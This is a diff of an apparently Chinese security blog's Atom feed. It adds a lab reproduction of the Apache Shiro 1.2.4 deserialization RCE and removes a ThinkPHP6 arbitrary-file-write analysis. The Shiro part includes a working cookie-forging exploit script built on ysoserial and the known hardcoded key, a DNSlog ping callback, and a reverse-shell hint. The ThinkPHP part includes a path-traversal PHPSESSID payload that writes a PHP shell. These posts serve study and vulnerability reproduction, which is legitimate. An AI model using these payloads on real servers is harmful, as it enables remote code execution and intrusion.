@@ -1,4 +1,102 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-28T15:32:13+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">CVE-2020-3452: Cisco ASA/FTD 任意文件读取漏洞</title><link href="http://localhost:4000/blog/cisco-asa/" rel="alternate" type="text/html" title="CVE-2020-3452: Cisco ASA/FTD 任意文件读取漏洞" /><published>2020-07-28T16:08:09+08:00</published><updated>2020-07-28T16:08:09+08:00</updated><id>http://localhost:4000/blog/cisco-asa</id><content type="html" xml:base="http://localhost:4000/blog/cisco-asa/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-31T16:56:51+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">Apache Shiro 1.2.4反序列化</title><link href="http://localhost:4000/blog/shiro/" rel="alternate" type="text/html" title="Apache Shiro 1.2.4反序列化" /><published>2020-07-31T17:08:09+08:00</published><updated>2020-07-31T17:08:09+08:00</updated><id>http://localhost:4000/blog/shiro</id><content type="html" xml:base="http://localhost:4000/blog/shiro/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#概述&quot; id=&quot;markdown-toc-概述&quot;&gt;概述&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#复现环境&quot; id=&quot;markdown-toc-复现环境&quot;&gt;复现环境&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#复现过程&quot; id=&quot;markdown-toc-复现过程&quot;&gt;复现过程&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#高科技&quot; id=&quot;markdown-toc-高科技&quot;&gt;高科技&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&quot;概述&quot;&gt;概述&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;产生原因&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化.然而AES的密钥是硬编码的, 就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;影响范围&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Apache Shiro &amp;lt;= 1.2.4&lt;/p&gt;
+
+&lt;h1 id=&quot;复现环境&quot;&gt;复现环境&lt;/h1&gt;
+
+&lt;p&gt;kali里的docker，pull一个已有镜像&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker pull medicean/vulapps:s_shiro_1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;启动环境，8081代表环境运行在宿主机的8081端口&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run -d 8081:8080 medicean/vulapps:s_shiro_1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;复现过程&quot;&gt;复现过程&lt;/h1&gt;
+
+&lt;p&gt;访问http://127.0.0.1:8081&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200731_shiro/login.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;抓包查看，响应包中存在rememberMe=deleteMe&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200731_shiro/rememberme.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我们这里用&lt;a href=&quot;http://www.dnslog.cn/&quot;&gt;DNSlog&lt;/a&gt;来证明漏洞存在，获取一个DNSlog:hvl78d.dnslog.cn&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200731_shiro/dnslog.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;生成新的&lt;strong&gt;rememberMe&lt;/strong&gt;脚本&lt;strong&gt;shiro.py&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
+import base64
+import uuid
+from random import Random
+import subprocess
+from Crypto.Cipher import AES
+
+def encode_rememberme(command):
+    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
+    BS   = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
+    mode =  AES.MODE_CBC
+    iv   =  uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    file_body = pad(popen.stdout.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == '__main__':
+    payload = encode_rememberme(sys.argv[1])    
+    with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:
+        print(&quot;rememberMe={}&quot;.format(payload.decode()), file=fpw)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;生成新的&lt;strong&gt;rememberMe&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python shiro.py &quot;ping hvl78d.dnslog.cn&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;生成一个名为payload.cookie的文件，将里面的&lt;strong&gt;rememberMe&lt;/strong&gt;复制到之前burp抓包中，放行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200731_shiro/repeater.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看DNSlog&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200731_shiro/hvl78d.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;证明漏洞存在，可以通过vps反弹shell&lt;/p&gt;
+
+&lt;p&gt;注：如果不成功，看看自己是不是登录以后抓的包，如果是登录以后抓的包就不能复现&lt;/p&gt;
+
+&lt;h1 id=&quot;高科技&quot;&gt;高科技&lt;/h1&gt;
+
+&lt;p&gt;ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。
+&lt;a href=&quot;https://github.com/feihong-cs/ShiroExploit&quot;&gt;Github项目地址&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;fuzhi&quot;&gt;https://cloud.tencent.com/developer/article/1540882&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;yes&quot;&gt;https://www.jianshu.com/p/0007eafd1f92&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ps：文章内容均为本人学习记录，造成其他后果不负责任&lt;/p&gt;</content><author><name>true</name></author><category term="漏洞复现" /><summary type="html">概述 概述</summary></entry><entry><title type="html">CVE-2020-3452: Cisco ASA/FTD 任意文件读取漏洞</title><link href="http://localhost:4000/blog/cisco-asa/" rel="alternate" type="text/html" title="CVE-2020-3452: Cisco ASA/FTD 任意文件读取漏洞" /><published>2020-07-28T16:08:09+08:00</published><updated>2020-07-28T16:08:09+08:00</updated><id>http://localhost:4000/blog/cisco-asa</id><content type="html" xml:base="http://localhost:4000/blog/cisco-asa/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#漏洞描述&quot; id=&quot;markdown-toc-漏洞描述&quot;&gt;漏洞描述&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#漏洞编号&quot; id=&quot;markdown-toc-漏洞编号&quot;&gt;漏洞编号&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#影响版本&quot; id=&quot;markdown-toc-影响版本&quot;&gt;影响版本&lt;/a&gt;&lt;/li&gt;
@@ -2727,275 +2825,4 @@ Requests/sec.: 8.759149
 &lt;p&gt;使用某个recipes：&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --recip outrecipe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html"></summary></entry><entry><title type="html">ThinkPHP6任意文件操作漏洞</title><link href="http://localhost:4000/blog/thinkphp6.0/" rel="alternate" type="text/html" title="ThinkPHP6任意文件操作漏洞" /><published>2020-03-13T15:13:21+08:00</published><updated>2020-03-13T15:13:21+08:00</updated><id>http://localhost:4000/blog/thinkphp6.0</id><content type="html" xml:base="http://localhost:4000/blog/thinkphp6.0/">&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#环境准备&quot; id=&quot;markdown-toc-环境准备&quot;&gt;环境准备&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#洞析漏洞分析&quot; id=&quot;markdown-toc-洞析漏洞分析&quot;&gt;洞析（漏洞分析）&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#复现漏洞&quot; id=&quot;markdown-toc-复现漏洞&quot;&gt;复现漏洞&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#其他的坑&quot; id=&quot;markdown-toc-其他的坑&quot;&gt;其他的坑&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell&lt;/p&gt;
-
-&lt;p&gt;具体受影响版本为ThinkPHP6.0.0-6.0.1&lt;/p&gt;
-
-&lt;p&gt;👻最早是看别人写了如何复现的，然后这几天搭建Ubuntu+PHP7.1+ThinkPHP6.0.0并复现这个任意文件操作漏洞&lt;/p&gt;
-
-&lt;p&gt;主要归纳为追踪SessionId怎么就可以篡改啦&lt;/p&gt;
-
-&lt;p&gt;在什么特定情况下可以getshell啦&lt;/p&gt;
-
-&lt;h1 id=&quot;环境准备&quot;&gt;环境准备&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;PHP7.1&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get -y install php7.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;https://www.kancloud.cn/manual/thinkphp6_0/1037481&quot;&gt;ThinkPHP6&lt;/a&gt;&lt;/p&gt;
-
-    &lt;p&gt;安装&lt;code class=&quot;highlighter-rouge&quot;&gt;Composer&lt;/code&gt;&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -sS https://getcomposer.org/installer | php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;如果有什么乱七八糟错误，可以试一试&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;然后移动&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mv composer.phar /usr/local/bin/composer
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;修改源为阿里源&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;安装ThinkPHP6.0&lt;/p&gt;
-
-    &lt;p&gt;💢坑：这里不需要写&lt;code class=&quot;highlighter-rouge&quot;&gt;topthink/think=6.0.0dev&lt;/code&gt;，不然会失败，版本可以在安装完之后修改配置文件进行版本覆盖&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer create-project topthink/think=6.0.x-dev tp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;💢坑：&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;蛤？🙄搞不明白，还改了半天php的配置文件，把extension=php_fileinfo.dll的勾掉，其实不需要，&lt;a href=&quot;https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&quot;&gt;参考这篇文章&lt;/a&gt;，增加&lt;code class=&quot;highlighter-rouge&quot;&gt;--ignore-platform-reqs&lt;/code&gt;&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;就好惹😍
-&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;cd进入安装好的tp&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;访问http://localhost:8000/，此时是最新的6.0.2版本&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;修改为6.0.0版本，将&lt;code class=&quot;highlighter-rouge&quot;&gt;/app/composer.json:24&lt;/code&gt;修改为&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;topthink/framework&quot;: &quot;6.0.0&quot;,
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;然后执行将版本覆盖为6.0.0&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer update
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;再次&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;http://localhost:8000/就会是6.0.0版本了&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;洞析漏洞分析&quot;&gt;洞析（漏洞分析）&lt;/h1&gt;
-
-&lt;p&gt;参考：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://hacpai.com/article/1579965339516&quot;&gt;ThinkPHP6 任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw&quot;&gt;ThinkPHP6任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;😒咋两篇名字一样&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;官方信息：ThinkPHP 发布的补丁声称修复了一处由于不安全的 SessionId 导致的任意文件操作漏洞：在开启 Session 的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以 getshell。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;根据这些信息，我们到官方 GitHub 的 commit 页面找一下相关的提交记录：&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;在src/think/session/Store.php 中 212 行在设置 &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; 时增加了一个函数：&lt;code class=&quot;highlighter-rouge&quot;&gt;ctype_alnum($text)&lt;/code&gt;，这个函数就是判断所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回 FALSE，所以可能是存储 Session 时导致的文件写入&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;跟进找一下相关的函数&lt;/p&gt;
-
-    &lt;p&gt;可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:254&lt;/code&gt; 的 save()函数&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;263行write写入sessionId，265行delete删除sessionId，继续跟进write函数，在&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/driver/File.php:210&lt;/code&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;$sessID&lt;/code&gt;来&lt;code class=&quot;highlighter-rouge&quot;&gt;getFileName&lt;/code&gt;，然后直接&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;写入，继续追踪&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;函数，还是在File.php下&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;可以看到调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; 函数，这里是真正写入文件的操作了&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file_put_contents($path, $content, LOCK_EX);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;如果文件名不存在，则创建文件，否则现有文件将被覆盖，除非设置了FILE_APPEND标志。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;分析：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;
-        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents($path,$content,LOCK_EX)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$content&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt;&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$data&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt;&lt;/p&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionID,$sessiData&lt;/code&gt; 来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;save()&lt;/code&gt; 中调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt;，同时传入的参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 的值是调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;getId()&lt;/code&gt; 传入的&lt;/p&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;综上，文件名来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt;，当传入的 id 值长度为 32 ，创建 &lt;code class=&quot;highlighter-rouge&quot;&gt;sessionId&lt;/code&gt;，然后进行 &lt;code class=&quot;highlighter-rouge&quot;&gt;gitId()&lt;/code&gt;，就是这里判断不足&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/session32.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;接下来找调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;setId()&lt;/code&gt; 的地方&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/middleware/SessionInit.php:46&lt;/code&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookieName&lt;/code&gt; 的值为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;， &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookie&lt;/code&gt; 中名为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; 的值，因此是攻击者可控的，从而导致写入的文件名可控。&lt;/p&gt;
-
-    &lt;p&gt;但是默认环境下，&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; 的内容由 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:261&lt;/code&gt; 的变量 &lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 传入：&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 在默认环境中为空:&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;所以，可利用的条件比较苛刻&lt;/p&gt;
-
-    &lt;p&gt;👹一是默认情况下是不开启session的，开启session才可以实现任意文件操作&lt;/p&gt;
-
-    &lt;p&gt;👹二是写入的 session内容是由实际的后端业务逻辑来决定，只有特定情况才能getshell&lt;/p&gt;
-
-    &lt;p&gt;那接下来就get一下shell吧&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;复现漏洞&quot;&gt;复现漏洞&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;，加一句&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',&quot;1&quot;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;开启session，去掉&lt;code class=&quot;highlighter-rouge&quot;&gt;app/middleware.php:9&lt;/code&gt;中的注释&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/middleware.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;访问，抓包，将&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;改为目录地址&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cookie: PHPSESSID=../../../../public/sueisokkk.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;💢坑：这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;一定要是32位的&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下会生成的session😀&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;来恶意操作一下，把&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;里写入&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',$_GET[&quot;c&quot;]);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/getc.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;访问，抓包，数据包内容&lt;/p&gt;
-
